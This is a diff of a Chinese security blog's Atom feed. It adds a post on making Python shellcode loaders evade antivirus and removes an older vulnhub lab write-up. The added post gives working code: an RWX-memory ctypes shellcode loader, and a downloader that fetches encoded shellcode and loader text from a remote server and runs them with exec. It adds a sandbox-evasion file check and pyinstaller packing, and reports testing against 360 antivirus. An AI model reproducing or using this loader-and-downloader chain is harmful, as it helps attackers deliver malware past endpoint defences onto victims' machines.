@@ -6,7 +6,7 @@
   <link href="https://syst1m.top/atom.xml" rel="self"/>
   
   <link href="https://syst1m.top/"/>
-  <updated>2023-03-08T09:55:33.633Z</updated>
+  <updated>2023-05-16T08:51:24.474Z</updated>
   <id>https://syst1m.top/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>python bypss 第二弹</title>
+    <link href="https://syst1m.top/2023/05/16/python-bypss-%E7%AC%AC%E4%BA%8C%E5%BC%B9/"/>
+    <id>https://syst1m.top/2023/05/16/python-bypss-%E7%AC%AC%E4%BA%8C%E5%BC%B9/</id>
+    <published>2023-05-16T08:14:00.000Z</published>
+    <updated>2023-05-16T08:51:24.474Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没什么技术含量,响应群友要求水一篇</p><h1 id="shellcode处理"><a href="#shellcode处理" class="headerlink" title="shellcode处理"></a>shellcode处理</h1><p>生成python的payload</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161623151.png" alt="image-20230516162321944"></p><p>取出shellcode去掉”\x”就是这个样子</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161628772.png" alt="image-20230516162821737"></p><p>base64编码一下,当然还可以继续加密,异或或者aes等等,自写加密也行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161628481.png" alt="image-20230516162841455"></p><p>保存为一个,或者多个txt文件,或者图片隐写,都可以,这里只提供一个简单思路</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161630200.png" alt="image-20230516163022164"></p><h1 id="加载器处理"><a href="#加载器处理" class="headerlink" title="加载器处理"></a>加载器处理</h1><p>加载器,就不多说了,shellcode好比子弹,加载器就是手枪,加载器网上到处都是,无非就是申请,读写,执行内存.加载器对于免杀很重要,现在大多数的加载器api都被打上标记了</p><p>提供一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64;rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>);ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode),<span class="built_in">len</span>(shellcode));handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>加载器同理shellcode,base64编码一下,也可以继续加密,保存为txt放到服务器上</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161635708.png" alt="image-20230516163518666"></p><h1 id="下载器"><a href="#下载器" class="headerlink" title="下载器"></a>下载器</h1><p>现在写主程序,也就是下载器,我们用这个程序去远程下载加载器和shellcode,只要你服务器不被标记,谁敢说我这是木马??</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes, urllib.request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取shellcode</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>():</span><br><span class="line">    base64_code = urllib.request.urlopen(<span class="string">&#x27;http://x.x.x.x/shellcode.txt&#x27;</span>).read()</span><br><span class="line">    shellcode = base64.b64decode(base64_code)</span><br><span class="line">    shellcode = <span class="built_in">bytes</span>.fromhex(<span class="built_in">str</span>(shellcode, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取加载器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_loader</span>():</span><br><span class="line">    base64_loader = urllib.request.urlopen(<span class="string">&#x27;http://x.x.x.x/loader.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> base64_loader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    shellcode = get_code()</span><br><span class="line">    loader = get_loader()</span><br><span class="line">    <span class="built_in">exec</span>(base64.b64decode(loader))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写个main.py再套个壳,使用import加载调用,再判断下当前路径是否存在这个ok.txt文件,不存在不执行,算是防止被杀软之类的放进沙箱吧,似乎有一点卵用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> loader</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&#x27;ok.txt&#x27;</span>):</span><br><span class="line">    loader.main()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The file does not exist and will not be executed&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h1><p>pyinstaller打包的时候再加密一下</p><p>![image-20230516164242251](&#x2F;Users&#x2F;chenci&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230516164242251.png)</p><p>记得放个ok.txt才会正常运行,正常上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161646454.png" alt="image-20230516164600412"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161645041.png" alt="image-20230516164529002"></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>嫌麻烦只测了360</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161647480.png" alt="image-20230516164700432"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;没什么技术含量,响应群友要求水一篇&lt;/p&gt;
+&lt;h1 id=&quot;shellcode处理&quot;&gt;&lt;a href=&quot;#shellcode处理&quot; class=&quot;headerlink&quot; title=&quot;shellcode处理&quot;&gt;&lt;/a&gt;shellcode处理&lt;/h1&gt;&lt;p&gt;生成python的payload&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202305161623151.png&quot; alt=&quot;image-20230516162321944&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
+    
+    
+    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
+    
+    <category term="bypass" scheme="https://syst1m.top/tags/bypass/"/>
+    
+  </entry>
   
   <entry>
     <title>从外网 Weblogic 打进内网，再到约束委派接管域控</title>
@@ -526,40 +551,6 @@
     <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
     
     <category term="udf提权" scheme="https://syst1m.top/tags/udf%E6%8F%90%E6%9D%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>vuln-Momentum2打靶</title>
-    <link href="https://syst1m.top/2022/07/27/vulnhub-Momentum2%E6%89%93%E9%9D%B6/"/>
-    <id>https://syst1m.top/2022/07/27/vulnhub-Momentum2%E6%89%93%E9%9D%B6/</id>
-    <published>2022-07-27T13:47:49.000Z</published>
-    <updated>2022-07-27T16:21:42.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><table><thead><tr><th>攻击机</th><th>靶机</th></tr></thead><tbody><tr><td>172.16.17.140</td><td>172.16.17.158</td></tr></tbody></table><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png"></p><p>开放22,80端口，访问web服务没有功能点，继续扫目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272225529.png"></p><p>访问&#x2F;js存在存在一个js文件</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272228711.png" style="zoom:50%;" /><p>dashboard.html是一个上传页面</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272230972.png"></p><p>ajax.php无任何回显</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272232356.png"></p><p>结合上面的信息知道是一个上传脚本，后端由ajax.php去处理</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>尝试上传shell，被过滤</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272244313.png"></p><p>继续fuzz,发现后缀为txt的上传成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272245618.png"></p><p>但是没有返回上传路径，换个字典继续，扫出了上传路径和一个备份文件ajax.php.bak</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272305974.png"></p><p>查看备份文件，当cookie为字段admin&#x3D;&amp;G6u@B6uDXMq&amp;Ms时可以上传php,还提示需要在cookie末尾添加一个大写字母，同时post字段secure的值为val1d</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272307017.png"></p><p>burp发包开始爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272359360.png"></p><p>当最后一位大写字母为R的时候，上传成功,拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280005485.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>继续往下，翻到一个密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280006415.png"></p><p>ssh上去拿到一个完整的shell，这里有一个小坑，[]里的单词是*的意思，在密码app后面加个 * 即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280010238.png"></p><p>linux提权三板斧，suid，sudo无密码，内核</p><p>找到一个root权限无密码的py文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280015799.png"></p><p>接受输入，执行命令去产生cookie并输出，没有过滤存在rce</p><p>kali起一个监听，然后执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280020452.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280020643.png"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;攻击机&lt;/th&gt;
-&lt;th&gt;靶机&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;&lt;tr&gt;
-&lt;td&gt;172.16.17.140&lt;/td&gt;
-&lt;td&gt;172.16.17.158&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行扫描&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
-    
-    
-    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
     
   </entry>
   
